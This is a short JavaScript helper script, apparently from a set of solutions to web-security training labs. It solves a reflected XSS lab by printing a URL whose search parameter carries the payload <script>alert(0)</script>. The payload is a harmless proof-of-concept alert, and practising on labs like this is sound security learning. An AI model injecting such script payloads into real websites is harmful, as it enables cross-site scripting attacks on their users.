import { getParsedInput } from "../../../utils/getParsedInput.js";
import { runTasks } from "../../../utils/runTasks.js";

const { url } = getParsedInput({
  description: "Lab: Reflected XSS into HTML context with nothing encoded",
});

function task() {
  const searchParam = "?search=";
  const payload = "<script>alert(0)</script>";
  console.log(`
Just visit this url to solve the lab:
  "${url}${searchParam}${payload}"`);
}

runTasks([task]);
